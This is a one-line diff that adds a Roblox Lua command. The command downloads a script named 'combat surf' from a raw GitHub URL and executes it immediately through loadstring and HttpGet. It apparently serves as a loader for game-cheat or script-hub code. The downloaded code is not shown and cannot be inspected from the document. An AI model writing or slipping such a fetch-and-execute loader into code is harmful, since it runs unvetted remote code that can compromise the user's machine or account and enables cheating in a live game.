@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/theneutral0ne/hey/refs/heads/main/combat%20surf"))()
